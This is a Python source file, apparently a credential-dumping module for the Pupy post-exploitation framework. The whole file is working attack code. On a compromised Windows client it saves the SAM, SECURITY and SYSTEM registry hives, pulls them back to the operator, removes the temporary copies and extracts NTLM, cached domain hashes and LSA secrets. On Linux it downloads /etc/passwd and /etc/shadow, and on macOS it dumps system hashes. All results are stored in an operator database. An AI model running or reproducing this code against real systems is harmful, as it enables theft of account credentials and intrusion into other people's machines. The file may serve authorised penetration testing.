# -*- coding: utf-8 -*-

# Author: DeveloppSoft - developpsoft.github.io

# Changelogs:
# 26 May 2016
#  init (not working, 'System' process block the download of the hives...
#
# 28 May 2016
#  save the hives with 'reg save' before downloading

# TODO
# saves the hives with a random name
# do not write the saves on the target

from pupylib.PupyModule import *
from pupylib.PupyCompleter import *
from pupylib.utils.credentials import Credentials
from modules.lib.utils.shell_exec import shell_exec

from rpyc.utils.classic import download

import os
import os.path
import ntpath

# CredDump imports
from modules.lib.windows.creddump.win32.domcachedump import dump_hashes
from modules.lib.windows.creddump.addrspace import HiveFileAddressSpace
from modules.lib.windows.creddump.win32.hashdump import get_bootkey, get_hbootkey
from modules.lib.windows.creddump.win32.hashdump import get_user_hashes, get_user_keys, get_user_name
from modules.lib.windows.creddump.win32.hashdump import empty_lm, empty_nt
from modules.lib.windows.creddump.win32.lsasecrets import get_file_secrets

__class_name__="CredDump"

@config(cat="creds", compatibilities=['windows', 'linux', 'darwin'], tags=['creds',
    'credentials', 'password', 'gather', 'hives'])
class CredDump(PupyModule):

    """ download the hives from a remote windows system and dump creds """

    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog='hive', description=self.__doc__)

    def run(self, args):
        self.rep = os.path.join("data", "downloads", self.client.short_name(), "creds")
        try:
            os.makedirs(self.rep)
        except Exception:
            pass

        if self.client.is_windows():
            self.windows()
        elif self.client.is_linux():
            self.linux()
        elif self.client.is_darwin():
            self.darwin()

    def darwin(self):
        self.client.load_package("hashdump")
        hashes = self.client.conn.modules["hashdump"].hashdump()
        if hashes:
            db = Credentials()
            db.add([
                {'Hash':hsh[1], 'Login': hsh[0], 'Category': 'System hash', 'uid':self.client.short_name(), 'CredType': 'hash'} for hsh in hashes
            ])
            for hsh in hashes:
                self.log('{}'.format(hsh))
            
            self.success("Hashes stored on the database")
        else:
            self.error('no hashes found')

    def linux(self):
        known = set()
        hashes = []

        def add_hashes(line):
            user, hsh, rest = line.split(':', 2)
            if not hsh in ('!','*','x') and not (user, hsh) in known:
                known.add((user, hsh))
                hashes.append(line)

        try:
            passwd = os.path.join(self.rep, 'passwd')
            download(
                self.client.conn,
                '/etc/passwd',
                passwd
            )

            with open(passwd, 'r') as fpasswd:
                for line in fpasswd.readlines():
                    add_hashes(line)

        except Exception as e:
            self.error('/etc/passwd is not accessible: {}'.format(e))

        try:
            shadow = os.path.join(self.rep, 'shadow')
            download(
                self.client.conn,
                '/etc/shadow',
                shadow
            )

            with open(shadow, 'r') as fshadow:
                for line in fshadow.readlines():
                    add_hashes(line)

        except Exception as e:
            self.error('/etc/shadow is not accessible: {}'.format(e))

        self.client.load_package('pupyutils.safepopen')
        sopen = self.client.conn.modules['pupyutils.safepopen'].SafePopen

        try:
            with open(os.path.join(self.rep, 'getent.passwd'), 'w') as passwd:
                for line in sopen(['getent', 'passwd']).execute():
                    if line:
                        add_hashes(line)

        except Exception as e:
            self.error('getent passwd failed: {}: {}'.format(type(e), e.message))

        try:
            with open(os.path.join(self.rep, 'getent.shadow'), 'w') as shadow:
                for line in sopen(['getent', 'shadow']).execute():
                    if line:
                        add_hashes(line)

        except Exception as e:
            self.error('getent shadow failed: {}: {}'.format(type(e), e.message))

        db = Credentials()
        db.add([
            {'Hash':':'.join(hsh.split(':')[1:]), 'Login': hsh.split(':')[0], 'Category': 'Shadow hash', 'uid':self.client.short_name(), 'CredType': 'hash'} for hsh in hashes
        ])

        for hsh in hashes:
            self.log('{}'.format(hsh))
        
        self.success("Hashes stored on the database")

    def windows(self):
        # First, we download the hives...

        #detect windows version
        is_vista=False
        try:
            if self.client.conn.modules['sys'].getwindowsversion()[0] >=6:
                is_vista=True
                self.info("windows > vista detected")
            else:
                self.info("windows < vista detected")
        except:
            self.warning("windows version couldn't be determined. supposing vista=False")

        self.success("saving SYSTEM hives in %TEMP%...")
        cmds = ("reg save HKLM\\SYSTEM %TEMP%/SYSTEM", "reg save HKLM\\SECURITY %TEMP%/SECURITY", "reg save HKLM\\SAM %TEMP%/SAM")
        if is_vista:
            cmds = ( x+' /y' for x in cmds )

        for cmd in cmds:
            self.info("running %s..." % cmd)
            self.log(shell_exec(self.client, cmd))
        self.success("hives saved!")
        remote_temp=self.client.conn.modules['os.path'].expandvars("%TEMP%")

        self.info("downloading SYSTEM hive...")
        download(self.client.conn, ntpath.join(remote_temp, "SYSTEM"), os.path.join(self.rep, "SYSTEM"))

        self.info("downloading SECURITY hive...")
        download(self.client.conn, ntpath.join(remote_temp, "SECURITY"), os.path.join(self.rep, "SECURITY"))

        self.info("downloading SAM hive...")
        download(self.client.conn, ntpath.join(remote_temp, "SAM"), os.path.join(self.rep, "SAM"))

        self.success("hives downloaded to %s" % self.rep)

        # Cleanup
        self.success("cleaning up saves...")
        try:
            self.client.conn.modules.os.remove(ntpath.join(remote_temp, "SYSTEM"))
            self.client.conn.modules.os.remove(ntpath.join(remote_temp, "SECURITY"))
            self.client.conn.modules.os.remove(ntpath.join(remote_temp, "SAM"))
            self.success("saves deleted")
        except Exception as e:
            self.warning("error deleting temporary files: %s"%str(e))

        # Time to run creddump!
        db = Credentials()
        hashes = []

        # HiveFileAddressSpace - Volatilty
        sysaddr = HiveFileAddressSpace(os.path.join(self.rep, "SYSTEM"))
        secaddr = HiveFileAddressSpace(os.path.join(self.rep, "SECURITY"))
        samaddr = HiveFileAddressSpace(os.path.join(self.rep, "SAM"))

        # Print the results
        self.success("dumping cached domain passwords...")

        for (u, d, dn, h) in dump_hashes(sysaddr, secaddr, is_vista):
            self.log("%s:%s:%s:%s" % (u.lower(), h.encode('hex'),
                d.lower(), dn.lower()))
            hashes.append({'Login': u.lower(), 'Hash': "%s:%s:%s" % (h.encode('hex'), d.lower(), dn.lower()), 'Category': 'MSCACHE hash', 'CredType': 'hash', 'uid':self.client.short_name()})

        self.success("dumping LM and NT hashes...")
        bootkey = get_bootkey(sysaddr)
        hbootkey = get_hbootkey(samaddr,bootkey)
        for user in get_user_keys(samaddr):
            lmhash, nthash = get_user_hashes(user,hbootkey)
            if not lmhash: lmhash = empty_lm
            if not nthash: nthash = empty_nt
            self.log("%s:%d:%s:%s:::" % (get_user_name(user), int(user.Name, 16), lmhash.encode('hex'), nthash.encode('hex')))
            hashes.append({'Login': get_user_name(user), 'Hash': "%s:%s" % (lmhash.encode('hex'), nthash.encode('hex')), 'Category': 'NTLM hash', 'CredType': 'hash', 'uid':self.client.short_name()})

        db.add(hashes)
        self.success("Hashes stored on the database")

        self.success("dumping lsa secrets...")
        secrets = get_file_secrets(os.path.join(self.rep, "SYSTEM"), os.path.join(self.rep, "SECURITY"), is_vista)
        if not secrets:
            self.error("unable to read LSA secrets, perhaps the hives are corrupted")
            return
        for key in secrets:
            self.log(key)
            self.log(self.dump(secrets[key], length=16))

        # The End! (hurrah)
        self.success("dump was successfull!")

    def dump(self, src, length=8):
        FILTER=''.join([(len(repr(chr(x)))==3) and chr(x) or '.' for x in range(256)])
        N=0; result=''
        while src:
           s,src = src[:length],src[length:]
           hexa = ' '.join(["%02X"%ord(x) for x in s])
           s = s.translate(FILTER)
           result += "%04X   %-*s   %s\n" % (N, length*3, hexa, s)
           N+=length
        return result
